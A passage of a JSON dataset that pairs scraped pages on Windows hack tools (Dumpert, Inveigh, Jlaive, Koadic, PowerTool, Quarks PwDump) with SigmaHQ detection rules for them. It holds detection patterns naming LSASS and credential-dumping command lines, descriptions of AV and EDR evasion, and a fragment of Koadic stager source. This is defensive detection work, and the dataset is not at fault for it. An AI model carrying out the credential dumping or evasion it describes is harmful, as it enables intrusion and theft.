            "tasklist /v /fo csv",
            "findstr /i \"lsass\""
          ]
        },
        "condition": "1 of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_crackmapexec_patterns.yml"
  },
  "209": {
    "url": "https://github.com/outflanknl/Dumpert",
    "markdown": "# Dumpert ## Folders and Files - Dumpert-Aggressor - Dumpert-DLL - Dumpert - README.md ## README **Dumpert, an LSASS memory dumper using direct system calls and API unhooking** Recent malware research shows that there is an increase in malware that is using direct system calls to evade user-mode API hooks used by security products. This tool demonstrates the use of direct System Calls and API unhooking and combines these techniques in a proof of concept code which can be used to create a LSASS memory dump using Cobalt Strike, while not touching disk and evading AV/EDR monitored user-mode API calls.",
    "sigma_rule": {
      "title": "HackTool - Dumpert Process Dumper Execution",
      "id": "2704ab9e-afe2-4854-a3b1-0c0706d03578",
      "status": "test",
      "description": "Detects the use of Dumpert process dumper, which dumps the lsass.exe process memory",
      "references": [
        "https://github.com/outflanknl/Dumpert",
        "https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2020-02-04",
      "modified": "2025-01-22",
      "tags": [
        "attack.credential-access",
        "attack.t1003.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Hashes|contains": "MD5=09D278F9DE118EF09163C6140255C690"
          },
          {
            "CommandLine|contains": "Dumpert.dll"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Very unlikely"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_dumpert.yml"
  },
  "210": {
    "url": "https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/",
    "markdown": "# Actors Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations ## Executive Summary On September 10, 2019, we observed unknown threat actors exploiting a vulnerability in SharePoint described in CVE-2019-0604 to install several webshells on the website of a Middle East government organization. One of these webshells is the open source AntSword webshell freely available on Github, which is remarkably similar to the infamous China Chopper webshell. On January 10, 2020, we used Shodan to search for Internet accessible servers running versions of SharePoint vulnerable to CVE-2019-0604. While admittedly the version numbers provided by SharePoint within HTTP responses",
    "sigma_rule": {
      "title": "HackTool - Dumpert Process Dumper Execution",
      "id": "2704ab9e-afe2-4854-a3b1-0c0706d03578",
      "status": "test",
      "description": "Detects the use of Dumpert process dumper, which dumps the lsass.exe process memory",
      "references": [
        "https://github.com/outflanknl/Dumpert",
        "https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2020-02-04",
      "modified": "2025-01-22",
      "tags": [
        "attack.credential-access",
        "attack.t1003.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Hashes|contains": "MD5=09D278F9DE118EF09163C6140255C690"
          },
          {
            "CommandLine|contains": "Dumpert.dll"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Very unlikely"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_dumpert.yml"
  },
  "211": {
    "url": "https://github.com/Kevin-Robertson/Inveigh",
    "markdown": "# Inveigh Inveigh is a cross-platform .NET IPv4/IPv6 machine-in-the-middle tool for penetration testers. This repo contains the primary C# version as well as the legacy PowerShell version. ## Overview Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol-specific listeners/sockets. The packet sniffing method, which was the basis for the original PowerShell version of this tool, has the following advantages: - SMB NTLM challenge/response captures over the Windows SMB service - Fewer visible port binds on the host system The primary disadvantage is the required elevated access. On current versions of Windows, the default running UDP services",
    "sigma_rule": {
      "title": "HackTool - Inveigh Execution",
      "id": "b99a1518-1ad5-4f65-bc95-1ffff97a8fd0",
      "status": "test",
      "description": "Detects the use of Inveigh a cross-platform .NET IPv4/IPv6 machine-in-the-middle tool",
      "references": [
        "https://github.com/Kevin-Robertson/Inveigh",
        "https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-10-24",
      "modified": "2023-02-04",
      "tags": [
        "attack.credential-access",
        "attack.t1003.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": "\\Inveigh.exe"
          },
          {
            "OriginalFileName": [
              "\\Inveigh.exe",
              "\\Inveigh.dll"
            ]
          },
          {
            "Description": "Inveigh"
          },
          {
            "CommandLine|contains": [
              " -SpooferIP",
              " -ReplyToIPs ",
              " -ReplyToDomains ",
              " -ReplyToMACs ",
              " -SnifferIP"
            ]
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Very unlikely"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_inveigh.yml"
  },
  "212": {
    "url": "https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/",
    "markdown": "# PYSA/Mespinoza Ransomware **Published on:** November 23, 2020 ## Intro Over the course of 8 hours, the PYSA/Mespinoza threat actors used Empire, Koadic, and RDP to move laterally throughout the environment, grabbing credentials from as many systems as possible on the way to their objective. The threat actors took their time, looking for files and reviewing the backup server before executing ransomware on all systems. Hours after being ransomed, our files were opened from multiple Tor exit nodes, which confirms our suspicion that files had been exfiltrated. PYSA/Mespinoza seemed to make its big splash when CERT-FR published a report on",
    "sigma_rule": {
      "title": "HackTool - Inveigh Execution",
      "id": "b99a1518-1ad5-4f65-bc95-1ffff97a8fd0",
      "status": "test",
      "description": "Detects the use of Inveigh a cross-platform .NET IPv4/IPv6 machine-in-the-middle tool",
      "references": [
        "https://github.com/Kevin-Robertson/Inveigh",
        "https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-10-24",
      "modified": "2023-02-04",
      "tags": [
        "attack.credential-access",
        "attack.t1003.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": "\\Inveigh.exe"
          },
          {
            "OriginalFileName": [
              "\\Inveigh.exe",
              "\\Inveigh.dll"
            ]
          },
          {
            "Description": "Inveigh"
          },
          {
            "CommandLine|contains": [
              " -SpooferIP",
              " -ReplyToIPs ",
              " -ReplyToDomains ",
              " -ReplyToMACs ",
              " -SnifferIP"
            ]
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Very unlikely"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_inveigh.yml"
  },
  "213": {
    "url": "https://jstnk9.github.io/jstnk9/research/Jlaive-Antivirus-Evasion-Tool",
    "markdown": "# Using Jlaive to create batch files from .NET assemblies for defense evasion **May 24, 2022** ## Summary Jlaive is a project created to evade antivirus by creating batch files from .NET assemblies. The way it does it is very interesting and gives a new window of opportunities to actors to evade defenses and execute their payloads. You can find the project on their official GitHub: https://github.com/ch2sh/Jlaive ## Creating the batch file with Jlaive In order to test the operation and the different events generated by this tool on a system, batch files must first be generated. The project currently",
    "sigma_rule": {
      "title": "HackTool - Jlaive In-Memory Assembly Execution",
      "id": "0a99eb3e-1617-41bd-b095-13dc767f3def",
      "status": "test",
      "description": "Detects the use of Jlaive to execute assemblies in a copied PowerShell",
      "references": [
        "https://jstnk9.github.io/jstnk9/research/Jlaive-Antivirus-Evasion-Tool",
        "https://web.archive.org/web/20220514073704/https://github.com/ch2sh/Jlaive"
      ],
      "author": "Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)",
      "date": "2022-05-24",
      "modified": "2023-02-22",
      "tags": [
        "attack.execution",
        "attack.t1059.003"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "parent_selection": {
          "ParentImage|endswith": "\\cmd.exe",
          "ParentCommandLine|endswith": ".bat"
        },
        "selection1": {
          "Image|endswith": "\\xcopy.exe",
          "CommandLine|contains|all": [
            "powershell.exe",
            ".bat.exe"
          ]
        },
        "selection2": {
          "Image|endswith": "\\xcopy.exe",
          "CommandLine|contains|all": [
            "pwsh.exe",
            ".bat.exe"
          ]
        },
        "selection3": {
          "Image|endswith": "\\attrib.exe",
          "CommandLine|contains|all": [
            "+s",
            "+h",
            ".bat.exe"
          ]
        },
        "condition": "parent_selection and (1 of selection*)"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_jlaive_batch_execution.yml"
  },
  "214": {
    "url": "https://web.archive.org/web/20220514073704/https://github.com/ch2sh/Jlaive",
    "markdown": "# Jlaive ## Folders and Files - Jlaive-CLI - Jlaive - Jlaive.sln - LICENSE - README.md ## README ### Jlaive Jlaive is an antivirus evasion tool that can convert .NET assemblies into undetectable batch files. Support for native applications will come soon. Join the Discord server for discussion and enquiries: https://discord.gg/RU5RjSe8WN. ##### Screenshots ```image Description: The image is a screenshot of a user interface for a tool named 'Jlaive'. It displays a window with a text box labeled 'File path:' where users can input a file location. Below this, there are several checkboxes for options including 'Bypass AMSI', 'Self delete',",
    "sigma_rule": {
      "title": "HackTool - Jlaive In-Memory Assembly Execution",
      "id": "0a99eb3e-1617-41bd-b095-13dc767f3def",
      "status": "test",
      "description": "Detects the use of Jlaive to execute assemblies in a copied PowerShell",
      "references": [
        "https://jstnk9.github.io/jstnk9/research/Jlaive-Antivirus-Evasion-Tool",
        "https://web.archive.org/web/20220514073704/https://github.com/ch2sh/Jlaive"
      ],
      "author": "Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)",
      "date": "2022-05-24",
      "modified": "2023-02-22",
      "tags": [
        "attack.execution",
        "attack.t1059.003"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "parent_selection": {
          "ParentImage|endswith": "\\cmd.exe",
          "ParentCommandLine|endswith": ".bat"
        },
        "selection1": {
          "Image|endswith": "\\xcopy.exe",
          "CommandLine|contains|all": [
            "powershell.exe",
            ".bat.exe"
          ]
        },
        "selection2": {
          "Image|endswith": "\\xcopy.exe",
          "CommandLine|contains|all": [
            "pwsh.exe",
            ".bat.exe"
          ]
        },
        "selection3": {
          "Image|endswith": "\\attrib.exe",
          "CommandLine|contains|all": [
            "+s",
            "+h",
            ".bat.exe"
          ]
        },
        "condition": "parent_selection and (1 of selection*)"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_jlaive_batch_execution.yml"
  },
  "215": {
    "url": "https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/",
    "markdown": "# Sofacy Group’s Parallel Attacks **Published:** June 6, 2018 **Categories:** Malware Nation-State Cyberattacks Threat Research **Tags:** AutoIT Carberp DealersChoice Ministry of Foreign Affairs Sofacy Zebrocy ## Summary The Sofacy group remains a persistent global threat. Unit 42 and others have shown in the first half of 2018 how this threat actor group continues to target multiple organizations throughout the world with a strong emphasis on government, diplomatic, and other strategic organizations primarily in North America and Europe. Following up our most recent Sofacy research in February and March of 2018, we have found a new campaign that uses a lesser-known",
    "sigma_rule": {
      "title": "HackTool - Koadic Execution",
      "id": "5cddf373-ef00-4112-ad72-960ac29bac34",
      "status": "test",
      "description": "Detects command line parameters used by Koadic hack tool",
      "references": [
        "https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/",
        "https://github.com/offsecginger/koadic/blob/457f9a3ff394c989cdb4c599ab90eb34fb2c762c/data/stager/js/stdlib.js",
        "https://blog.f-secure.com/hunting-for-koadic-a-com-based-rootkit/"
      ],
      "author": "wagga, Jonhnathan Ribeiro, oscd.community",
      "date": "2020-01-12",
      "modified": "2023-02-11",
      "tags": [
        "attack.execution",
        "attack.t1059.003",
        "attack.t1059.005",
        "attack.t1059.007"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\cmd.exe"
          },
          {
            "OriginalFileName": "Cmd.Exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "/q",
            "/c",
            "chcp"
          ]
        },
        "condition": "all of selection_*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_koadic.yml"
  },
  "216": {
    "url": "https://github.com/offsecginger/koadic/blob/457f9a3ff394c989cdb4c599ab90eb34fb2c762c/data/stager/js/stdlib.js",
    "markdown": "# koadic / data / stager / js / stdlib.js ``` var Koadic = {}; Koadic.FS = new ActiveXObject(\"Scripting.FileSystemObject\"); Koadic.WS = new ActiveXObject(\"WScrip\"+\"t.Shell\"); Koadic.STAGER = \"~URL~\"; Koadic.SESSIONKEY = \"~SESSIONKEY~\"; Koadic.JOBKEY = \"~JOBKEY~\"; Koadic.JOBKEYPATH = \"~URL~?~SESSIONNAME~=~SESSIONKEY~;~JOBNAME~=\"; Koadic.EXPIRE = \"~_EXPIREEPOCH_~\"; /** * Sleeps the current thread * * @param int ms - how long to sleep in milliseconds * @param function callback - where to continue execution after the sleep * * @return void */ //sleep.start Koadic.sleep = function(#ms#, #callback#) { if (Koadic.isHTA()) { window.setTimeout(#callback#, #ms#); } else { var #now# = new Date().getTime(); while (new Date().getTime() < #now# + #ms#); #callback#();",
    "sigma_rule": {
      "title": "HackTool - Koadic Execution",
      "id": "5cddf373-ef00-4112-ad72-960ac29bac34",
      "status": "test",
      "description": "Detects command line parameters used by Koadic hack tool",
      "references": [
        "https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/",
        "https://github.com/offsecginger/koadic/blob/457f9a3ff394c989cdb4c599ab90eb34fb2c762c/data/stager/js/stdlib.js",
        "https://blog.f-secure.com/hunting-for-koadic-a-com-based-rootkit/"
      ],
      "author": "wagga, Jonhnathan Ribeiro, oscd.community",
      "date": "2020-01-12",
      "modified": "2023-02-11",
      "tags": [
        "attack.execution",
        "attack.t1059.003",
        "attack.t1059.005",
        "attack.t1059.007"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\cmd.exe"
          },
          {
            "OriginalFileName": "Cmd.Exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "/q",
            "/c",
            "chcp"
          ]
        },
        "condition": "all of selection_*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_koadic.yml"
  },
  "217": {
    "url": "https://blog.f-secure.com/hunting-for-koadic-a-com-based-rootkit/",
    "markdown": "# Hunting for Koadic – a COM-based rootkit **Date:** 13.11.17 **Categories:** Threats & Research **Tags:** F-Secure Countercept, Managed Detection and Response --- In this post, we will be examining the core functionality of Koadic – an open source tool created by zerosum0x0. Koadic is a post-exploitation toolkit that provides remote access, as well as many different modules covering enumeration, pivoting, and escalation. The server-side component is written in Python and the agent-side components are written in Javascript/VBscript. Koadic supports four different stagers – mshta/regsvr/rundll32_js/disk (dropped file) – and twenty-eight different implants (at the time of our analysis). This post will",
    "sigma_rule": {
      "title": "HackTool - Koadic Execution",
      "id": "5cddf373-ef00-4112-ad72-960ac29bac34",
      "status": "test",
      "description": "Detects command line parameters used by Koadic hack tool",
      "references": [
        "https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/",
        "https://github.com/offsecginger/koadic/blob/457f9a3ff394c989cdb4c599ab90eb34fb2c762c/data/stager/js/stdlib.js",
        "https://blog.f-secure.com/hunting-for-koadic-a-com-based-rootkit/"
      ],
      "author": "wagga, Jonhnathan Ribeiro, oscd.community",
      "date": "2020-01-12",
      "modified": "2023-02-11",
      "tags": [
        "attack.execution",
        "attack.t1059.003",
        "attack.t1059.005",
        "attack.t1059.007"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\cmd.exe"
          },
          {
            "OriginalFileName": "Cmd.Exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "/q",
            "/c",
            "chcp"
          ]
        },
        "condition": "all of selection_*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_koadic.yml"
  },
  "218": {
    "url": "https://thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/",
    "markdown": "# Emotet Strikes Again – LNK File Leads to Domain Wide Ransomware **Categories:** adfind cobaltstrike ransomware **Published on:** November 28, 2022 --- In June of 2022, we observed a threat actor gaining access to an environment via Emotet and operating over an eight-day period. During this time, multiple rounds of enumeration and lateral movement occurred using Cobalt Strike. Remote access tools were used for command and control, such as Tactical RMM and Anydesk. The threat actors' final actions included data exfiltration using Rclone and domain-wide deployment of Quantum Ransomware. We have observed similar traits in previous cases where Emotet and",
    "sigma_rule": {
      "title": "HackTool - PowerTool Execution",
      "id": "a34f79a3-8e5f-4cc3-b765-de00695452c2",
      "status": "test",
      "description": "Detects the execution of the tool PowerTool which has the ability to kill a process, delete its process file, unload drivers, and delete the driver files",
      "references": [
        "https://thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/",
        "https://www.trendmicro.com/en_us/research/22/i/play-ransomware-s-attack-playbook-unmasks-it-as-another-hive-aff.html",
        "https://twitter.com/gbti_sa/status/1249653895900602375?lang=en",
        "https://www.softpedia.com/get/Antivirus/Removal-Tools/ithurricane-PowerTool.shtml"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-11-29",
      "modified": "2023-02-04",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": [
              "\\PowerTool.exe",
              "\\PowerTool64.exe"
            ]
          },
          {
            "OriginalFileName": "PowerTool.exe"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_powertool.yml"
  },
  "219": {
    "url": "https://www.trendmicro.com/en_us/research/22/i/play-ransomware-s-attack-playbook-unmasks-it-as-another-hive-aff.html",
    "markdown": "# Play Ransomware's Attack Playbook Similar to that of Hive, Nokoyawa **Ransomware** **Date:** September 06, 2022 Play is a new ransomware that takes a page out of Hive and Nokoyawa's playbook. The many similarities among them indicate that Play, like Nokoyawa, are operated by the same people. --- ## Introduction In July, we investigated a spate of ransomware cases in the Latin American region that targeted government entities, which was initially attributed to a new player known as Play ransomware. This ransomware’s name was derived from its behavior, as it adds the extension “.play” after encrypting files. Its ransom note",
    "sigma_rule": {
      "title": "HackTool - PowerTool Execution",
      "id": "a34f79a3-8e5f-4cc3-b765-de00695452c2",
      "status": "test",
      "description": "Detects the execution of the tool PowerTool which has the ability to kill a process, delete its process file, unload drivers, and delete the driver files",
      "references": [
        "https://thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/",
        "https://www.trendmicro.com/en_us/research/22/i/play-ransomware-s-attack-playbook-unmasks-it-as-another-hive-aff.html",
        "https://twitter.com/gbti_sa/status/1249653895900602375?lang=en",
        "https://www.softpedia.com/get/Antivirus/Removal-Tools/ithurricane-PowerTool.shtml"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-11-29",
      "modified": "2023-02-04",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": [
              "\\PowerTool.exe",
              "\\PowerTool64.exe"
            ]
          },
          {
            "OriginalFileName": "PowerTool.exe"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_powertool.yml"
  },
  "220": {
    "url": "https://twitter.com/gbti_sa/status/1249653895900602375?lang=en",
    "markdown": "# Post Apr 13, 2020 #Matrix #Ransomware Group hacking via RDP brute-force, utilizing PowerTool64.exe to disable active anti-virus protection. Using Advanced IP Scanner to find network hosts and mimikatz to escalate privs. \"Work\" files dropped to C:/PerfBoot/*. Hide your RDPs!",
    "sigma_rule": {
      "title": "HackTool - PowerTool Execution",
      "id": "a34f79a3-8e5f-4cc3-b765-de00695452c2",
      "status": "test",
      "description": "Detects the execution of the tool PowerTool which has the ability to kill a process, delete its process file, unload drivers, and delete the driver files",
      "references": [
        "https://thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/",
        "https://www.trendmicro.com/en_us/research/22/i/play-ransomware-s-attack-playbook-unmasks-it-as-another-hive-aff.html",
        "https://twitter.com/gbti_sa/status/1249653895900602375?lang=en",
        "https://www.softpedia.com/get/Antivirus/Removal-Tools/ithurricane-PowerTool.shtml"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-11-29",
      "modified": "2023-02-04",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": [
              "\\PowerTool.exe",
              "\\PowerTool64.exe"
            ]
          },
          {
            "OriginalFileName": "PowerTool.exe"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_powertool.yml"
  },
  "221": {
    "url": "https://www.softpedia.com/get/Antivirus/Removal-Tools/ithurricane-PowerTool.shtml",
    "markdown": "# PowerTool **For Windows** ```image Alt: PowerTool icon Description: The image depicts an icon representing the PowerTool software for Windows. The icon features a shield with four quadrants colored in orange, blue, and white, suggesting a focus on security or protection. The associated text provides details about the software version (4.8 x86 / 2.0 x64), its last update date (March 13, 2016), a certification indicating it is 100% clean, and that it is available as freeware. ``` **Latest version:** **4.8 x86 / 2.0 x64** **Last updated:** **Mar 13, 2016** **Certified 100% CLEAN** **License:** **Freeware** --- ## #Rootkit scanner A rather",
    "sigma_rule": {
      "title": "HackTool - PowerTool Execution",
      "id": "a34f79a3-8e5f-4cc3-b765-de00695452c2",
      "status": "test",
      "description": "Detects the execution of the tool PowerTool which has the ability to kill a process, delete its process file, unload drivers, and delete the driver files",
      "references": [
        "https://thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/",
        "https://www.trendmicro.com/en_us/research/22/i/play-ransomware-s-attack-playbook-unmasks-it-as-another-hive-aff.html",
        "https://twitter.com/gbti_sa/status/1249653895900602375?lang=en",
        "https://www.softpedia.com/get/Antivirus/Removal-Tools/ithurricane-PowerTool.shtml"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-11-29",
      "modified": "2023-02-04",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": [
              "\\PowerTool.exe",
              "\\PowerTool64.exe"
            ]
          },
          {
            "OriginalFileName": "PowerTool.exe"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_powertool.yml"
  },
  "222": {
    "url": "https://github.com/quarkslab/quarkspwdump",
    "markdown": "# quarkslab / quarkspwdump ## Folders and Files - src - CHANGELOG.txt - MAKE.txt - QuarksADDumper.sln - README.md - README.txt ## README ### quarkspwdump Dump various types of Windows credentials without injecting in any process.",
    "sigma_rule": {
      "title": "HackTool - Quarks PwDump Execution",
      "id": "0685b176-c816-4837-8e7b-1216f346636b",
      "status": "test",
      "description": "Detects usage of the Quarks PwDump tool via commandline arguments",
      "references": [
        "https://github.com/quarkslab/quarkspwdump",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/seedworm-apt-iran-middle-east"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-05",
      "modified": "2023-02-05",
      "tags": [
        "attack.credential-access",
        "attack.t1003.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": {
          "Image|endswith": "\\QuarksPwDump.exe"
        },
        "selection_cli": {
          "CommandLine": [
            " -dhl",
            " --dump-hash-local",
            " -dhdc",
            " --dump-hash-domain-cached",
            " --dump-bitlocker",
            " -dhd ",
            " --dump-hash-domain ",
            "--ntds-file"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_quarks_pwdump.yml"
  },
  "223": {
    "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/seedworm-apt-iran-middle-east",
    "markdown": "# Seedworm: Iran-Linked Group Continues to Target Organizations in the Middle East **Group continues to be highly active in 2020, while tentative links to recently discovered PowGoop tool suggest possible retooling.** Posted: 21 Oct, 2020 --- The Iran-linked espionage group Seedworm (aka MuddyWater) has been highly active in recent months, attacking a wide range of targets, including a large number of government organizations in the Middle East. Many of the organizations attacked by Seedworm in recent months have also been targeted by a recently discovered tool called PowGoop (Downloader.Covic), suggesting that it is a tool that Seedworm has incorporated into",
    "sigma_rule": {
      "title": "HackTool - Quarks PwDump Execution",
      "id": "0685b176-c816-4837-8e7b-1216f346636b",
      "status": "test",
      "description": "Detects usage of the Quarks PwDump tool via commandline arguments",
      "references": [
        "https://github.com/quarkslab/quarkspwdump",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/seedworm-apt-iran-middle-east"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-05",
      "modified": "2023-02-05",
      "tags": [
        "attack.credential-access",
        "attack.t1003.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": {
          "Image|endswith": "\\QuarksPwDump.exe"
        },
        "selection_cli": {
          "CommandLine": [
            " -dhl",
            " --dump-hash-local",
            " -dhdc",
            " --dump-hash-domain-cached",
            " --dump-bitlocker",
            " -dhd ",
            " --dump-hash-domain ",
            "--ntds-file"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_quarks_pwdump.yml"
  },
  "224": {
    "url": "https://web.archive.org/web/20240222070028/https://redmimicry.com/posts/redmimicry-winnti/",
    "markdown": "# RedMimicry Prototype - Winnti Emulation ## The RedMimicry Platform Prototype *This post describes an early RedMimicry prototype and does not reflect the current state of the product.* The RedMimicry platform prototype is built in a modular way in order to provide a good framework for the implementation of emulation profiles. Emulation profiles can be divided into the following components: - payload delivery and staging - command & control traffic encoding - automated breach emulation script This RedMimicry release aims to emulate the behavior of the Winnti malware from around 2015. Naturally, not all behavior is exactly replicated, but the",
    "sigma_rule": {
      "title": "HackTool - RedMimicry Winnti Playbook Execution",
      "id": "95022b85-ff2a-49fa-939a-d7b8f56eeb9b",
      "status": "test",
      "description": "Detects actions caused by the RedMimicry Winnti playbook a automated breach emulations utility",
      "references": [
        "https://web.archive.org/web/20240222070028/https://redmimicry.com/posts/redmimicry-winnti/"
      ],
      "author": "Alexander Rausch",
      "date": "2020-06-24",
      "modified": "2023-03-01",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.t1106",
        "attack.t1059.003",
        "attack.t1218.011"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\rundll32.exe",
            "\\cmd.exe"
          ],
          "CommandLine|contains": [
            "gthread-3.6.dll",
            "\\Windows\\Temp\\tmp.bat",
            "sigcmm-2.4.dll"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_redmimicry_winnti_playbook.yml"
  },
  "225": {
    "url": "https://securityxploded.com/",
    "markdown": "",
    "sigma_rule": {
      "title": "HackTool - SecurityXploded Execution",
      "id": "7679d464-4f74-45e2-9e01-ac66c5eb041a",
      "status": "stable",
      "description": "Detects the execution of SecurityXploded Tools",
      "references": [
        "https://securityxploded.com/",
        "https://web.archive.org/web/20200601000524/https://cyberx-labs.com/blog/gangnam-industrial-style-apt-campaign-targets-korean-industrial-companies/"
      ],
